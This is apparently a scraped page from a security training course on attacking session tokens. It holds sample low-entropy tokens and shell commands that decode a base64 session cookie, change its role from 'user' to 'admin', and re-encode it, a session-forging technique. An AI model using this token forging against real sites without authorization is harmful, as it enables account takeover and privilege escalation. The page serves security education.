<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/80/section/782
// Platform Version: V1
// Module ID: 80
// Module Name: Broken Authentication
// Module Difficulty: Medium
// Section ID: 782
// Section Title: Attacking Session Tokens
// Page Title: Hack The Box - Academy
// Page Number: 12
-->

# Attacking Session Tokens

**Module Name:** Broken Authentication **Page Number:** 12

#### 

#### BROKEN AUTHENTICATION

# Attacking Session Tokens

## Brute-Force Attack

![https://academy.hackthebox.com/storage/modules/269/session/session_1.png](https://academy.hackthebox.com/storage/modules/269/session/session_1.png)

![https://academy.hackthebox.com/storage/modules/269/session/session_2.png](https://academy.hackthebox.com/storage/modules/269/session/session_2.png)

```
2c0c58b27c71a2ec5bf2b4b6e892b9f9
2c0c58b27c71a2ec5bf2b4546092b9f9
2c0c58b27c71a2ec5bf2b497f592b9f9
2c0c58b27c71a2ec5bf2b48bcf92b9f9
2c0c58b27c71a2ec5bf2b4735e92b9f9
```

```
141233
141234
141237
141238
141240
```

## Attacking Predictable Session Tokens

![https://academy.hackthebox.com/storage/modules/269/session/session_3.png](https://academy.hackthebox.com/storage/modules/269/session/session_3.png)

``` shell-session
ndefstathiou@htb[/htb]$ echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d

user=htb-stdnt;role=user
```

``` shell-session
ndefstathiou@htb[/htb]$ echo -n 'user=htb-stdnt;role=admin' | base64

dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==
```

![https://academy.hackthebox.com/storage/modules/269/session/session_4.png](https://academy.hackthebox.com/storage/modules/269/session/session_4.png)

![https://academy.hackthebox.com/storage/modules/269/session/session_5.png](https://academy.hackthebox.com/storage/modules/269/session/session_5.png)

``` shell-session
ndefstathiou@htb[/htb]$ echo -n 'user=htb-stdnt;role=admin' | xxd -p

757365723d6874622d7374646e743b726f6c653d61646d696e
```

# 

# 

#### Questions

####